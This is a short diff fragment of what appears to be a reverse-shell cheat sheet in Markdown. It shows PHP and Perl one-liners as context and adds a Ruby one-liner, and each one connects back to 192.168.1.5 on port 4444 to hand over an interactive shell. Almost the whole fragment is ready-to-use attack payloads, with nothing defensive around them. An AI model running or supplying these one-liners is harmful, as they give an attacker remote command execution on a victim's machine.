@@ -112,9 +112,13 @@ php -r '$sock=fsockopen("192.168.1.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
   perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.1.5:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
   ```
 
+  [🔝 Back to Top](#top)
+  
 
-
- 
+# 7. Ruby
+ ```bash
+ruby -rsocket -e 'c=TCPSocket.new("192.168.1.5",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
 
 
 
